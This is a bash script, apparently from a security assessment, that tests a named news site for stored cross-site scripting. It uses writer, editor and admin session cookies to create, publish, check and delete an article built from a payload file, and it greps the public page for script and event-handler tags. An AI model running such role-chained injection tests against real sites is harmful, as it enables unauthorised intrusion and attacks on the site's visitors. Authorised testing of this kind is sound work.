#!/usr/bin/env bash
set -e
TARGET="https://www.thedownundernews.online"
JAR_W=/home/research/Projects/DownUnderNewsz/evidence/phase2/jar_writer.txt
JAR_E=/home/research/Projects/DownUnderNewsz/evidence/phase2/jar_editor.txt
JAR_A=/home/research/Projects/DownUnderNewsz/evidence/phase2/jar_admin.txt
EV=/home/research/Projects/DownUnderNewsz/evidence/phase3

echo "=== 1 CREATE as writer (draft) ==="
curl -sS -k -b "$JAR_W" -o "$EV/xss2-create.json" -w "status=%{http_code}\n" -m 15 \
     -X POST -H "Content-Type: application/json" \
     --data @"$EV/xss-payload.json" "$TARGET/api/admin/articles"
ID=$(python3 -c "import json;d=json.load(open('$EV/xss2-create.json'));a=d.get('article',d);print(a.get('id',''))")
SLUG=$(python3 -c "import json;d=json.load(open('$EV/xss2-create.json'));a=d.get('article',d);print(a.get('slug',''))")
echo "ID=$ID SLUG=$SLUG"

echo "=== 2 PUBLISH as editor ==="
curl -sS -k -b "$JAR_E" -o "$EV/xss2-publish-editor.json" -w "status=%{http_code}\n" -m 15 \
     -X PUT -H "Content-Type: application/json" \
     --data @"$EV/publish-payload.json" "$TARGET/api/admin/articles/${ID}"
cat "$EV/xss2-publish-editor.json" | python3 -c "import sys,json;d=json.load(sys.stdin);a=d.get('article',{});print('status=',a.get('status'),'published_at=',a.get('published_at'))"

echo "=== 3 PUBLIC VIEW ==="
curl -sS -k -o "$EV/xss2-public.html" -w "status=%{http_code} size=%{size_download}\n" -m 10 "$TARGET/article/${SLUG}"
echo "--- grep raw tags ---"
grep -nE 'CLAWSEC|<script|<img|<svg|onerror|onload|&lt;script' "$EV/xss2-public.html" | head -n 30 || echo "(no matches)"

echo "=== 4 DELETE (cleanup as admin) ==="
curl -sS -k -b "$JAR_A" -o "$EV/xss2-delete.json" -w "status=%{http_code}\n" -m 10 -X DELETE "$TARGET/api/admin/articles/${ID}"
cat "$EV/xss2-delete.json"
echo
echo "DONE id=$ID slug=$SLUG"
